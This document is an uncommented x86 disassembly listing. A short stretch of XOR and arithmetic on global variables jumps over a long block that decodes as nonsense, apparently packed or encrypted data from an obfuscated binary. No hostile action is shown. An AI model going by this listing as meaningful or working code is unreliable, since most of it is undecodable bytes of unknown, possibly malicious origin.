  4199b6:	mov    edx,0x1bf3
  4199bb:	mov    DWORD PTR ds:0x42815b,0x10c7
  4199c5:	mov    DWORD PTR ds:0x428377,0x1d16
  4199cf:	jmp    0x419a27
  4199d4:	mov    DWORD PTR ds:0x42825b,edi
  4199da:	cmp    DWORD PTR ds:0x42825b,0x0
  4199e1:	jge    0x419a0f
  4199e7:	push   0x428233
  4199ec:	push   0x427f5b
  4199f1:	call   DWORD PTR ds:0x428ea0
  4199f7:	sub    DWORD PTR ds:0x4283a7,ecx
  4199fd:	mov    ecx,DWORD PTR ds:0x42831f
  419a03:	sbb    DWORD PTR ds:0x4282a7,ecx
  419a09:	adc    edx,DWORD PTR ds:0x42838b
  419a0f:	and    edx,0x987
  419a15:	adc    DWORD PTR ds:0x428307,0x29fb
  419a1f:	sbb    ecx,edx
  419a21:	xor    DWORD PTR ds:0x4282ff,edi
  419a27:	xor    DWORD PTR [esp+0x40],eax
  419a2b:	mov    ebx,DWORD PTR ds:0x428317
  419a31:	xor    DWORD PTR ds:0x42822b,ebx
  419a37:	mov    DWORD PTR [esp+0x30],0x5b3d
  419a3f:	add    edx,0x5f01
  419a45:	mov    DWORD PTR [esp+0x34],0x4445
  419a4d:	sub    eax,DWORD PTR ds:0x42822f
  419a53:	mov    DWORD PTR [esp+0x10],0xa52
  419a5b:	mov    DWORD PTR [esp+0x14],0x1c69
  419a63:	mov    eax,DWORD PTR [esp+0x10]
  419a67:	jmp    0x419e36
  419a6c:	xchg   DWORD PTR [edi-0x63e03bea],ebp
  419a72:	inc    edx
  419a73:	sub    bh,BYTE PTR [edx-0x6d8f7006]
  419a79:	pop    edi
  419a7a:	jmp    0x16fd7e29
  419a7f:	sbb    BYTE PTR [edx+edx*1+0x46d81818],bh
  419a86:	dec    ebx
  419a87:	sub    DWORD PTR [ebx+edi*8-0x9a1b4d5],edx
  419a8e:	into   
  419a8f:	add    al,0x44
  419a91:	popa   
  419a92:	les    edx,FWORD PTR [edx-0x2cd7fbef]
  419a98:	stc    
  419a99:	adc    eax,0x58fde8ed
  419a9e:	pop    esp
  419a9f:	leave  
  419aa0:	clc    
  419aa1:	aaa    
  419aa2:	(bad)  [ebx+eiz*4-0x5d83674d]
  419aa9:	int    0x59
  419aab:	mov    edx,0x30ffca29
  419ab0:	pusha  
  419ab1:	pop    es
  419ab2:	in     eax,0xb9
  419ab4:	xor    cl,0x61
  419ab7:	les    ebp,FWORD PTR [ebx+ebx*2]
  419aba:	push   ecx
  419abb:	xchg   esp,eax
  419abc:	or     edi,DWORD PTR [esi+0x59a9a64e]
  419ac2:	mov    al,ds:0x225e00c2
  419ac7:	sbb    bl,dh
  419ac9:	out    dx,eax
  419aca:	mov    BYTE PTR [edi],0xa9
  419acd:	dec    edx
  419ace:	mov    al,ds:0x392716a9
  419ad3:	aaa    
  419ad4:	or     DWORD PTR [ecx],ebp
  419ad6:	mov    ebx,0x940f6e32
  419adb:	or     eax,0xedbe2694
  419ae0:	out    dx,eax
  419ae1:	shl    ah,0x3c
  419ae4:	mov    edi,?
  419ae6:	add    BYTE PTR [esi],dl
  419ae8:	js     0x419b40
  419aea:	cmp    eax,0xed7fb75
  419aef:	inc    ecx
  419af0:	cmp    eax,ebp
  419af2:	imul   edx,ebx,0xffffffc5
  419af5:	cmp    al,0xad
  419af7:	push   ebx
  419af8:	cmp    edi,ebp
  419afa:	fisttp QWORD PTR [ebx+0x6a]
  419afd:	mov    dh,0x2d
  419aff:	jae    0x419b4d
  419b01:	or     DWORD PTR gs:[ecx+0x36],edi
  419b05:	adc    dh,BYTE PTR [eax+0x5ab5c340]
  419b0b:	adc    al,0xbe
  419b0d:	adc    bl,BYTE PTR [edx-0x61]
  419b10:	outs   dx,DWORD PTR ds:[esi]
  419b11:	sub    ebp,DWORD PTR [esi+0x6c]
  419b14:	cs ret 0xa118
  419b18:	mov    dh,0x6a
  419b1a:	xchg   BYTE PTR [eax-0x4e3e105d],cl
  419b20:	scas   al,BYTE PTR es:[edi]
  419b21:	gs ret 
  419b23:	inc    ebp
  419b24:	dec    esp
  419b25:	mov    dh,0x62
  419b27:	xchg   edi,eax
  419b28:	ror    BYTE PTR [esi+0x190c9966],1
  419b2e:	(bad)  
  419b2f:	push   cs
  419b30:	cmp    eax,esi
  419b32:	push   ebx
  419b33:	popf   
  419b34:	dec    edx
  419b35:	xor    ecx,edx
  419b37:	shl    DWORD PTR [ecx+0x1d],1
  419b3a:	cdq    
  419b3b:	mov    edi,0xfac60b3
  419b40:	cmp    al,0x30
  419b42:	test   al,ch
  419b44:	stos   BYTE PTR es:[edi],al
  419b45:	retf   0x1a8c
  419b48:	inc    esi
  419b49:	ins    BYTE PTR es:[edi],dx
  419b4a:	xor    bl,BYTE PTR [edx-0x1c]
  419b4d:	mov    eax,ds:0xb07b6d0f
  419b52:	loopne 0x419b9c
  419b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b55:	iret   
  419b56:	es xchg ebp,eax
  419b58:	mov    eax,0x6237282f
  419b5d:	xchg   esi,eax
  419b5e:	and    eax,0xd110493f
  419b63:	mov    eax,ds:0xc4aa149a
  419b68:	cli    
  419b69:	cdq    
  419b6a:	addr16 sti 
  419b6c:	aam    0xf7
  419b6e:	xchg   ebp,eax
  419b6f:	jp     0x419b24
  419b71:	inc    esi
  419b72:	lock adc BYTE PTR [esi],ah
  419b75:	mov    bh,0x3
  419b77:	adc    DWORD PTR [ebx],esi
  419b79:	hlt    
  419b7a:	xor    dh,BYTE PTR [edx+0xd]
  419b7d:	shr    DWORD PTR [eax-0x55],0xf7
  419b81:	rol    DWORD PTR [esp+eax*8+0x36],1
  419b85:	fwait
  419b86:	aas    
  419b87:	nop
  419b88:	ins    DWORD PTR es:[edi],dx
  419b89:	jno    0x419b7a
  419b8b:	push   eax
  419b8c:	call   0x177d:0x90999d86
  419b93:	std    
  419b94:	push   ss
  419b95:	pop    edi
  419b96:	rcr    BYTE PTR [esi],0xa
  419b99:	ins    BYTE PTR es:[edi],dx
  419b9a:	hlt    
  419b9b:	jecxz  0x419b51
  419b9d:	pop    edi
  419b9e:	adc    BYTE PTR [ebx-0x7d59ad53],dl
  419ba4:	adc    al,0xbc
  419ba6:	std    
  419ba7:	out    dx,eax
  419ba8:	cwde   
  419ba9:	mov    cl,0x0
  419bab:	or     esi,ecx
  419bad:	js     0x419b7d
  419baf:	xchg   BYTE PTR [ecx-0x20],dl
  419bb2:	repz mov ds:0x50b34d5,eax
  419bb8:	rcr    DWORD PTR [ecx-0x3d],cl
  419bbb:	loope  0x419c36
  419bbd:	xlat   BYTE PTR ds:[ebx]
  419bbe:	daa    
  419bbf:	loope  0x419c39
  419bc1:	bound  ebx,QWORD PTR [ebx+0x14]
  419bc4:	and    ecx,DWORD PTR [esi-0x500065dc]
  419bca:	inc    edi
  419bcb:	daa    
  419bcc:	aas    
  419bcd:	test   DWORD PTR [ebx],0x543b27b8
  419bd3:	dec    esp
  419bd4:	popf   
  419bd5:	aam    0x51
  419bd7:	ss push esp
  419bd9:	addr16 mov ah,0x9
  419bdc:	or     eax,0xbcb2535e
  419be1:	sti    
  419be2:	push   es
  419be3:	mov    ebp,0x33345cda
  419be8:	addr16 inc ecx
  419bea:	xor    cl,BYTE PTR [eax+0x3c80307]
  419bf0:	pop    edx
  419bf1:	loopne 0x419c50
  419bf3:	scas   al,BYTE PTR es:[edi]
  419bf4:	call   0xff2d:0x8c746613
  419bfb:	adc    eax,0x921b4e07
  419c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c01:	push   0x7b5befbf
  419c06:	iret   
  419c07:	fistp  DWORD PTR [edi-0x5]
  419c0a:	cld    
  419c0b:	add    BYTE PTR [ebx],cl
  419c0d:	or     edi,DWORD PTR [esp+edi*1+0x5e14761]
  419c14:	aaa    
  419c15:	pop    esi
  419c16:	jne    0x419bc5
  419c18:	mov    ah,0xd
  419c1a:	sbb    bl,ah
  419c1c:	pushf  
  419c1d:	sbb    ah,BYTE PTR [ecx]
  419c1f:	cs cld 
  419c21:	inc    esp
  419c22:	je     0x419bc7
  419c24:	sub    edi,eax
  419c26:	cli    
  419c27:	int3   
  419c28:	mov    eax,0x3709843
  419c2d:	ins    BYTE PTR es:[edi],dx
  419c2e:	jb     0x419ca1
  419c30:	daa    
  419c31:	dec    edx
  419c32:	pushf  
  419c33:	mov    bh,0x66
  419c35:	mov    cl,dh
  419c37:	imul   ecx,DWORD PTR [esi-0x3d26cdd3],0xe9c2ea4c
  419c41:	add    eax,0xb71be5f6
  419c46:	jg     0x419c6b
  419c48:	jns    0x419c20
  419c4a:	jb     0x419cb2
  419c4c:	es icebp 
  419c4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c4f:	ret    
  419c50:	xchg   BYTE PTR [edi],bl
  419c52:	out    dx,al
  419c53:	sbb    DWORD PTR [esi],0xffffffd2
  419c56:	pop    ebx
  419c57:	adc    dh,ah
  419c59:	jecxz  0x419cd4
  419c5b:	adc    dl,BYTE PTR [ebp+0x3208d4ff]
  419c61:	jae    0x419c26
  419c63:	ja     0x419cba
  419c65:	or     esi,eax
  419c67:	push   edx
  419c68:	call   0xf112:0xbb69cb32
  419c6f:	xor    al,0x52
  419c71:	inc    esi
  419c72:	aaa    
  419c73:	mov    esp,0x8e9c0520
  419c78:	outs   dx,BYTE PTR ds:[esi]
  419c79:	call   0xa9323d0b
  419c7e:	xchg   ebx,eax
  419c7f:	mov    ecx,0x45812610
  419c84:	xchg   ebx,eax
  419c85:	in     al,0x69
  419c87:	jmp    0x16ab:0x8d9ffb3f
  419c8e:	cmp    ah,bh
  419c90:	cmp    BYTE PTR [ebp+0x5b5deafe],bl
  419c96:	test   al,0xea
  419c98:	sar    DWORD PTR [ebx+0x59],0xd6
  419c9c:	loop   0x419c6f
  419c9e:	xchg   ebp,eax
  419c9f:	push   ss
  419ca0:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  419ca2:	pop    esi
  419ca3:	jl     0x419d0b
  419ca5:	mov    DWORD PTR [eax-0x3827bdf6],edx
  419cab:	and    DWORD PTR [edi],edx
  419cad:	pop    edi
  419cae:	xchg   edx,eax
  419caf:	mov    ds:0x8ab8964c,al
  419cb4:	add    dl,BYTE PTR [esi]
  419cb6:	ret    0xfcea
  419cb9:	sar    DWORD PTR [ebx+0x3f8cf547],1
  419cbf:	cs dec ebp
  419cc1:	sbb    BYTE PTR [ebp+0x7b],cl
  419cc4:	jp     0x419c6b
  419cc6:	hlt    
  419cc7:	idiv   BYTE PTR [edx+0x526d94e]
  419ccd:	or     ecx,edi
  419ccf:	push   eax
  419cd0:	dec    ebx
  419cd1:	jecxz  0x419d0d
  419cd3:	(bad)  
  419cd4:	and    eax,0x343e1354
  419cd9:	ret    0xdfcd
  419cdc:	in     al,dx
  419cdd:	cmp    BYTE PTR [edx-0x1b],0x60
  419ce1:	outs   dx,DWORD PTR ds:[esi]
  419ce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ce3:	xchg   ah,ah
  419ce5:	shr    DWORD PTR [ebx+eax*8],0x25
  419ce9:	xchg   ebx,eax
  419cea:	into   
  419ceb:	add    dl,al
  419ced:	ret    
  419cee:	sub    BYTE PTR [ecx-0x63],al
  419cf1:	pop    es
  419cf2:	mov    ah,0xc4
  419cf4:	ficom  WORD PTR [edi+0x5506ad31]
  419cfa:	std    
  419cfb:	and    ecx,ecx
  419cfd:	cmc    
  419cfe:	retf   0x6d58
  419d01:	loopne 0x419ceb
  419d03:	mov    ebx,0x421ce80b
  419d08:	icebp  
  419d09:	hlt    
  419d0a:	sub    dh,BYTE PTR [ebx-0x58b60e9e]
  419d10:	les    ecx,FWORD PTR [ebx+0x7aa42598]
  419d16:	xchg   ebx,eax
  419d17:	pop    eax
  419d18:	outs   dx,BYTE PTR ds:[esi]
  419d19:	adc    DWORD PTR [edx+esi*2-0x3e08887],esi
  419d20:	inc    ebp
  419d21:	xchg   ebp,eax
  419d22:	cdq    
  419d23:	lods   al,BYTE PTR ds:[esi]
  419d24:	sub    eax,0x874a083d
  419d29:	inc    ecx
  419d2a:	sar    BYTE PTR [ebp+0x20],cl
  419d2d:	push   edi
  419d2e:	into   
  419d2f:	pushf  
  419d30:	sahf   
  419d31:	pop    edi
  419d32:	out    0xf4,al
  419d34:	ror    DWORD PTR [eax+0x680d084c],cl
  419d3a:	inc    esi
  419d3b:	pop    ecx
  419d3c:	js     0x419d76
  419d3e:	std    
  419d3f:	cdq    
  419d40:	cs int3 
  419d42:	jae    0x419d40
  419d44:	test   eax,0x338186a2
  419d49:	and    eax,0x9953059e
  419d4e:	xchg   ebp,eax
  419d4f:	inc    edx
  419d50:	inc    esp
  419d51:	cwde   
  419d52:	bound  ebp,QWORD PTR [edx-0x749daefe]
  419d58:	retf   0x47bb
  419d5b:	sub    al,0x19
  419d5d:	push   cs
  419d5e:	stc    
  419d5f:	pop    ss
  419d60:	retf   0x6921
  419d63:	adc    ecx,DWORD PTR [edx-0x7ac3eb4]
  419d69:	or     BYTE PTR [ecx-0x20],bl
  419d6c:	repz adc ecx,DWORD PTR [ebp-0x25]
  419d70:	push   esp
  419d71:	call   0x5ba0:0x2ecfd97f
  419d78:	xor    dl,ah
  419d7a:	scas   eax,DWORD PTR es:[edi]
  419d7b:	jbe    0x419dec
  419d7d:	jne    0x419d08
  419d7f:	imul   ecx,DWORD PTR [ebx-0x1a5c2fa0],0xab3a0926
  419d89:	jle    0x419db5
  419d8b:	dec    esi
  419d8c:	jb     0x419d35
  419d8e:	cwde   
  419d8f:	jp     0x419dc1
  419d91:	or     bh,dh
  419d93:	nop
  419d94:	adc    DWORD PTR [eax+0xc],edi
  419d97:	mov    edi,DWORD PTR [edx-0x7d9423b]
  419d9d:	dec    ebx
  419d9e:	and    bl,ah
  419da0:	or     BYTE PTR ds:0xe145a4a2,al
  419da6:	xchg   edx,ebx
  419da8:	repnz inc eax
  419daa:	mov    ch,BYTE PTR [esi]
  419dac:	pushf  
  419dad:	jnp    0x419df6
  419daf:	xchg   ebp,eax
  419db0:	lods   al,BYTE PTR ds:[esi]
  419db1:	xor    bh,BYTE PTR [ebx-0x67]
  419db4:	push   cs
  419db5:	xor    eax,0xe6c5312
  419dba:	adc    BYTE PTR [ecx],dl
  419dbc:	jno    0x419e13
  419dbe:	fst    QWORD PTR ss:[ecx-0x3a]
  419dc2:	adc    BYTE PTR [eax+0xb],bh
  419dc5:	mov    ebp,0xe3914751
  419dca:	in     eax,0xde
  419dcc:	inc    ebx
  419dcd:	inc    ebp
  419dce:	jge    0x419e48
  419dd0:	mov    ebp,0x1c21e84c
  419dd5:	jl     0x419d6e
  419dd7:	inc    edx
  419dd8:	lock xlat BYTE PTR ds:[ebx]
  419dda:	cmp    ch,BYTE PTR [edi+0x79]
  419ddd:	mov    ds:0xaf7b965b,eax
  419de2:	sahf   
  419de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419de4:	and    BYTE PTR [esi-0x4c],0x61
  419de8:	aas    
  419de9:	mov    cl,0xe2
  419deb:	ins    DWORD PTR es:[edi],dx
  419dec:	jmp    0x419d73
  419dee:	xchg   BYTE PTR [ecx],dh
  419df0:	cmp    DWORD PTR [ebx+0x29],eax
  419df3:	stos   BYTE PTR es:[edi],al
  419df4:	(bad)  
  419df5:	pop    ecx
  419df6:	pop    esp
  419df7:	jnp    0x419e3b
  419df9:	(bad)  
  419dfa:	push   ebx
  419dfb:	inc    eax
  419dfc:	addr16 into 
  419dfe:	cmp    al,0x95
  419e00:	inc    edi
  419e01:	enter  0xd385,0xd5
  419e05:	and    ebx,edi
  419e07:	loope  0x419dc6
  419e09:	test   BYTE PTR [ecx],bh
  419e0b:	leave  
  419e0c:	mov    ah,dh
  419e0e:	stc    
  419e0f:	and    bl,BYTE PTR [eax]
  419e11:	mov    ebx,DWORD PTR ds:0x8f258a4c
  419e17:	paddusb mm0,mm7
  419e1a:	pop    eax
  419e1b:	mov    ds:0x5d9075b2,al
  419e20:	push   0x27
  419e22:	fimul  WORD PTR [ebp+eiz*1-0x4d13ea5b]
  419e29:	cwde   
  419e2a:	test   BYTE PTR [ebx+0x3],ch
  419e2d:	push   es
  419e2e:	fs scas eax,DWORD PTR es:[edi]
  419e30:	retf   0x925f
  419e33:	pop    esi
  419e34:	shl    cl,cl
  419e36:	mov    ecx,DWORD PTR [esp+0x14]
  419e3a:	mov    edx,DWORD PTR [esp+0x30]
  419e3e:	mov    ebx,DWORD PTR [esp+0x34]
  419e42:	add    eax,0xffffd1a5
  419e47:	adc    ecx,0xffffedf0
  419e4d:	xor    eax,edx
  419e4f:	xor    ecx,ebx
  419e51:	jmp    0x41a220
  419e56:	pop    eax
  419e58:	es push esp
  419e5a:	sub    bl,BYTE PTR es:[ebx-0x46]
  419e5e:	pusha  
  419e5f:	in     eax,0xd3
  419e61:	mov    esp,0x708baced
  419e66:	xchg   BYTE PTR [ebp+0x12bc1816],dh
  419e6c:	sbb    BYTE PTR [eax],bl
  419e6e:	cs xchg ecx,eax
  419e70:	jmp    0xfad4da3
  419e75:	mov    ebx,DWORD PTR [ecx-0x7303a572]
  419e7b:	mov    ax,0x9b3e
  419e7f:	sub    al,0x9d
  419e81:	scas   al,BYTE PTR es:[edi]
  419e82:	and    BYTE PTR [edx+0x5a],dl
  419e85:	lds    esi,FWORD PTR ds:[ecx-0x5e67cb8d]
  419e8c:	mov    al,0x38
  419e8e:	fadd   st,st(3)
  419e90:	jmp    0xf5c40dec
  419e95:	or     al,0xac
  419e97:	mov    ebx,0xbadd33b0
  419e9c:	je     0x419e50
  419e9e:	push   esi
  419e9f:	and    eax,0xfbd3f60d
  419ea4:	and    DWORD PTR [edi+eiz*2],esp
  419ea7:	cdq    
  419ea8:	and    dl,dh
  419eaa:	hlt    
  419eab:	dec    edx
  419eac:	and    bh,ch
  419eae:	ss sbb eax,0xc6f7d067
  419eb4:	sar    BYTE PTR [ecx-0x16477b37],cl
  419eba:	pushf  
  419ebb:	test   eax,0x7e75b4a
  419ec0:	(bad)  
  419ec1:	in     al,0xc8
  419ec3:	pop    es
  419ec4:	std    
  419ec5:	fisttp QWORD PTR [eax+0x7f769c2]
  419ecb:	jae    0x419e7e
  419ecd:	mov    ebx,0x4cdf978e
  419ed2:	jbe    0x419f49
  419ed4:	inc    edx
  419ed5:	xchg   edx,eax
  419ed6:	push   0x99bb7573
  419edb:	aad    0x6c
  419edd:	jp     0x419ec6
  419edf:	hlt    
  419ee0:	aaa    
  419ee1:	dec    eax
  419ee2:	xor    al,0xf4
  419ee4:	xchg   esp,eax
  419ee5:	sub    BYTE PTR [ebp+0x6e],ch
  419ee8:	add    al,0xf4
  419eea:	jmp    0xe542daba
  419eef:	cmp    eax,0xf9f0c154
  419ef4:	dec    DWORD PTR [ecx-0x48]
  419ef7:	sbb    eax,0xfe3317f
  419efc:	ret    0x30d0
  419eff:	sahf   
  419f00:	ss push ebp
  419f02:	out    0x3c,eax
  419f04:	repnz push ds
  419f06:	int    0x98
  419f08:	rcr    DWORD PTR [esi+0x93f5d7f],cl
  419f0e:	xchg   DWORD PTR [edx+0x7a23a0a0],esi
  419f14:	fidiv  WORD PTR [edx]
  419f16:	cdq    
  419f17:	push   0x590971a1
  419f1c:	retf   
  419f1d:	popa   
  419f1e:	inc    DWORD PTR [esp+ebx*1+0x71]
  419f22:	mov    ds:0x45b70e15,al
  419f27:	adc    esp,edx
  419f29:	pop    eax
  419f2a:	pop    ebx
  419f2b:	test   al,0x7d
  419f2d:	les    ebx,FWORD PTR [ebp-0x5710de79]
  419f33:	(bad)  
  419f34:	jp     0x419fa1
  419f36:	mov    ebp,0xad7e1c37
  419f3b:	xor    ecx,ebx
  419f3d:	sub    BYTE PTR [eax-0x4],bl
  419f40:	cmp    al,dh
  419f42:	mov    WORD PTR [esi-0x52e9b1ac],gs
  419f48:	mov    es,WORD PTR [ebx-0x3351829e]
  419f4e:	jo     0x419f5b
  419f50:	mov    cl,0x4d
  419f52:	cmp    BYTE PTR [ebx-0x63],0x9e
  419f56:	jmp    0x492fbd0e
  419f5b:	stc    
  419f5c:	test   eax,0x68bb816
  419f61:	(bad)
  419f64:	inc    ebp
  419f65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f66:	je     0x419f4c
  419f68:	sub    BYTE PTR [ecx],0xf6
  419f6b:	nop
  419f6c:	iret   
  419f6d:	dec    edi
  419f6e:	dec    esi
  419f6f:	push   ebp
  419f70:	inc    ecx
  419f71:	xchg   ecx,eax
  419f72:	cmp    DWORD PTR [ecx+0x2f1628e4],esi
  419f78:	dec    esi
  419f79:	sub    ecx,DWORD PTR [ebx+esi*2-0xd]
  419f7d:	js     0x419f48
  419f7f:	nop
  419f80:	inc    edi
  419f81:	sub    ebx,esp
  419f83:	dec    esp
  419f84:	jb     0x419f2d
  419f86:	(bad)  
  419f87:	popa   
  419f88:	adc    al,0x72
  419f8a:	call   0xb307:0xfd1e6191
  419f91:	lods   al,BYTE PTR ds:[esi]
  419f92:	call   0xa21c:0xd2fd8127
  419f99:	jmp    0xa484eaaf
  419f9e:	sar    cl,cl
  419fa0:	(bad)
  419fa4:	test   ecx,ebx
  419fa6:	sbb    ch,BYTE PTR [ecx+eax*2+0x23eacff1]
  419fad:	push   ebp
  419fae:	shr    BYTE PTR [esi+0x1e9aa4a5],cl
  419fb4:	retf   0x18ec
  419fb7:	cmp    bl,BYTE PTR ss:[ebp+0xd9d39cc]
  419fbe:	aam    0xd2
  419fc0:	retf   0xb36a
  419fc3:	not    BYTE PTR [ebx+0x21aa13c9]
  419fc9:	shl    DWORD PTR [ebp+0x6d],cl
  419fcc:	rcl    dh,0xc6
  419fcf:	arpl   WORD PTR [edx+0xfa5da4b],bp
  419fd5:	mov    es,WORD PTR [edx]
  419fd7:	mov    DWORD PTR [esi+0x17],0x73470fcc
  419fde:	push   cs
  419fdf:	or     DWORD PTR [ecx],esp
  419fe1:	repnz and eax,0xce6b668f
  419fe7:	out    dx,al
  419fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fe9:	or     eax,0xc28dc548
  419fee:	adc    ebx,ebp
  419ff0:	outs   dx,DWORD PTR ds:[esi]
  419ff1:	and    bh,BYTE PTR [esp+eax*4]
  419ff4:	scas   eax,DWORD PTR es:[edi]
  419ff5:	mov    esp,DWORD PTR [edx]
  419ff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ff8:	add    eax,DWORD PTR [esi+0x42]
  419ffb:	out    dx,al
  419ffc:	scas   eax,DWORD PTR es:[edi]
  419ffd:	add    al,0xb
  419fff:	test   BYTE PTR [eax-0x69],dl
  41a002:	(bad)  
  41a003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a004:	call   0xe0d2:0x20845a31
  41a00b:	test   eax,0xad1540c8
  41a010:	mov    al,0x7d
  41a012:	xor    al,BYTE PTR [ecx]
  41a014:	sbb    BYTE PTR [ebx-0x5ffe4302],al
  41a01a:	repz mov ebp,0x1b731a94
  41a020:	popa   
  41a021:	data16 test dl,0xa0
  41a025:	sahf   
  41a026:	mov    WORD PTR [ebp+0x63b2427d],fs
  41a02c:	fbstp  TBYTE PTR [eax-0x7c2d6e5f]
  41a032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a033:	outs   dx,DWORD PTR ds:[esi]
  41a034:	sar    BYTE PTR [edi+ebp*8-0x5a],1
  41a038:	fistp  QWORD PTR es:[ebp+eax*8-0x135e5a0e]
  41a040:	dec    eax
  41a041:	mov    cl,bl
  41a043:	dec    esp
  41a044:	in     eax,0xf1
  41a046:	stos   DWORD PTR es:[edi],eax
  41a047:	pop    es
  41a048:	dec    esi
  41a049:	jmp    0xc862:0xe2becae
  41a050:	xlat   BYTE PTR ds:[ebx]
  41a051:	jnp    0x41a055
  41a053:	pop    ecx
  41a054:	jnp    0x41a014
  41a056:	fldln2 
  41a058:	mov    WORD PTR [ebp+0x41],?
  41a05b:	mov    esi,0x8da662ed
  41a061:	arpl   WORD PTR fs:[eax],cx
  41a064:	xchg   eax,edi
  41a066:	inc    ebx
  41a067:	in     al,dx
  41a068:	fisttp QWORD PTR [eax-0x458b133d]
  41a06e:	pushf  
  41a06f:	addr16 pushf 
  41a071:	jl     0x41a047
  41a073:	mov    WORD PTR [edx+0x4d7a1742],es
  41a079:	mov    bl,0x51
  41a07b:	mov    dl,ah
  41a07d:	sbb    cl,ah
  41a07f:	mov    dl,BYTE PTR [esi-0x31f60b11]
  41a085:	(bad)  
  41a088:	test   eax,0x4e662d46
  41a08d:	push   eax
  41a08e:	in     eax,0x66
  41a090:	xor    DWORD PTR [esp+eax*8-0x2a0b49],ecx
  41a097:	in     eax,0x9d
  41a099:	sub    eax,0x876abeed
  41a09e:	int    0x17
  41a0a0:	xor    DWORD PTR [eax],0xa54890f
  41a0a6:	jge    0x41a03d
  41a0a8:	xchg   edi,eax
  41a0a9:	sub    BYTE PTR [ebp+0xc8a4126],0x64
  41a0b0:	loope  0x41a0ae
  41a0b2:	clc    
  41a0b3:	dec    ebp
  41a0b4:	ss scas eax,DWORD PTR es:[edi]
  41a0b6:	dec    esp
  41a0b7:	sbb    esi,DWORD PTR [eax-0x50]
  41a0ba:	scas   al,BYTE PTR es:[edi]
  41a0bb:	ret    0x37c5
  41a0be:	aam    0x20
  41a0c0:	stos   DWORD PTR es:[edi],eax
  41a0c1:	dec    ecx
  41a0c2:	inc    esi
  41a0c3:	icebp  
  41a0c4:	fstp   QWORD PTR [esi+0x500cdadd]
  41a0ca:	into   
  41a0cb:	sbb    DWORD PTR ds:0x27b9c17c,ebx
  41a0d1:	adc    BYTE PTR [ebp-0x7e],dh
  41a0d4:	outs   dx,BYTE PTR ds:[esi]
  41a0d5:	mov    eax,ds:0x2d365000
  41a0da:	adc    bh,bl
  41a0dc:	xchg   ebx,eax
  41a0dd:	or     BYTE PTR ss:[ecx-0x30],bl
  41a0e1:	xor    eax,0x5f991455
  41a0e6:	sahf   
  41a0e7:	xchg   DWORD PTR [edx],ebp
  41a0e9:	mov    ah,ah
  41a0eb:	fild   DWORD PTR [bp+di+0x1c]
  41a0ef:	xor    ch,BYTE PTR [esi+0x4291fce4]
  41a0f5:	pop    ebx
  41a0f6:	retf   0x7c85
  41a0f9:	sub    BYTE PTR ds:0x45f3b978,0x56
  41a100:	cli    
  41a101:	cld    
  41a102:	call   0x63e3:0x7346899a
  41a109:	in     eax,dx
  41a10a:	jns    0x41a091
  41a10c:	push   0xffffff8a
  41a10e:	and    DWORD PTR [ebx],ebx
  41a110:	jg     0x41a17c
  41a112:	xor    dl,BYTE PTR [ebx+0x6]
  41a115:	cli    
  41a116:	lds    edi,FWORD PTR [eax-0x1]
  41a119:	aam    0xf
  41a11b:	mov    edi,es
  41a11d:	inc    edi
  41a11e:	cmp    edx,DWORD PTR [ebx-0x124e50e9]
  41a124:	daa    
  41a125:	mov    ah,0x6e
  41a127:	mov    ebx,0x666f9786
  41a12c:	add    eax,ebx
  41a12e:	dec    ebx
  41a12f:	xor    BYTE PTR [edx-0xc],bh
  41a132:	and    DWORD PTR [ebx+0x3b],ebx
  41a135:	mov    esi,DWORD PTR [edx+0x5cad90f4]
  41a13b:	inc    esi
  41a13c:	cwde   
  41a13d:	dec    ebp
  41a13e:	push   esp
  41a13f:	mov    esi,0x27bc3c9d
  41a144:	sti    
  41a145:	out    dx,eax
  41a146:	cld    
  41a147:	mov    eax,DWORD PTR [edx]
  41a149:	or     DWORD PTR [ebx-0x71],edi
  41a14c:	push   gs
  41a14e:	gs inc ebp
  41a150:	pop    ecx
  41a151:	lock jge 0x41a0d6
  41a154:	mov    DWORD PTR [edx-0x64],esi
  41a157:	ret    0x8b1f
  41a15a:	cmp    edi,DWORD PTR [ebx]
  41a15c:	icebp  
  41a15d:	mov    al,ds:0xc8065b33
  41a162:	dec    eax
  41a163:	and    DWORD PTR ds:0xa0bd82dc,esp
  41a169:	repz push edx
  41a16b:	sub    eax,0xd9a863e0
  41a170:	outs   dx,DWORD PTR ds:[esi]
  41a171:	mov    ch,0xe
  41a173:	mov    al,ds:0xf6abdd9c
  41a178:	xchg   ecx,eax
  41a179:	imul   eax,eax,0xffffff96
  41a17c:	aad    0x67
  41a17e:	js     0xc032a16a
  41a184:	jecxz  0x41a147
  41a186:	ja     0x41a16f
  41a188:	mov    dl,0xbc
  41a18a:	ds add eax,0x7f9ac98b
  41a190:	and    eax,0x53ae35e1
  41a195:	mov    edi,0x3176e014
  41a19a:	cmp    eax,0x3def6a52
  41a19f:	in     al,0xfa
  41a1a1:	mov    cs,WORD PTR [eax]
  41a1a3:	push   esi
  41a1a4:	sub    eax,0xcf79bc8
  41a1a9:	ss (bad) 
  41a1ab:	jae    0x41a20f
  41a1ad:	imul   edx,DWORD PTR [eax+0x15],0x901c0085
  41a1b4:	and    al,0xfc
  41a1b6:	call   0x792b85eb
  41a1bb:	cmp    BYTE PTR [ebp+0x2],0x7c
  41a1bf:	xchg   DWORD PTR [eax+0x7],ecx
  41a1c2:	loopne 0x41a191
  41a1c4:	stos   DWORD PTR es:[edi],eax
  41a1c5:	xchg   ecx,eax
  41a1c6:	fst    QWORD PTR [eax+ecx*8-0x368aa8bd]
  41a1ce:	mov    WORD PTR [ecx+0x21],?
  41a1d1:	pop    ds
  41a1d2:	imul   esp,DWORD PTR [ebx+eax*4-0x19c0626d],0xf0cb9f37
  41a1dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1de:	and    bh,ah
  41a1e0:	sysret 
  41a1e2:	add    esp,esp
  41a1e4:	jno    0x41a21d
  41a1e6:	(bad)  
  41a1e7:	xor    al,0xcb
